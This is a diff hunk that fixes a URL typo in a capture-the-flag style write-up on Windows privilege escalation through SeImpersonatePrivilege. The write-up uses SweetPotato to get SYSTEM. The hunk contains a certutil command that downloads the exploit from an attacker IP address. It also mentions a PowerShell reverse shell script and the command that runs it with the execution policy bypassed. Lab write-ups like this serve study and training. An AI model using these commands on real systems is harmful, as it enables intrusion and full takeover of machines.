@@ -211,7 +211,7 @@ The final privilege escalation leveraged Alex's SeImpersonatePrivilege using Swe
 <p>Alex has the SeImpersonatePrivilege. This means I can use a potato exploit to gain a SYSTEM shell.</p>
 <p>I'll start by trying sweet potato because I already had the executable.</p>
 <p>I will transport it onto the box using certutil.</p>
-<p><code>certutil -urlcache -f httpL//10.10.16.94:8000/SweetPotato.exe sweetpotato.exe</code></p>
+<p><code>certutil -urlcache -f http://10.10.16.94:8000/SweetPotato.exe sweetpotato.exe</code></p>
 <p>And a reverse shell as well. Just a regular powershell oneliner. I'll save it as rev.ps1.</p>
 <p>I stood up a listener in a different terminal and executed sweet potato.</p>
 <p><code>.\SweetPotato.exe -a 'powershell -ep bypass C:\programdata\rev.ps1'</code></p>
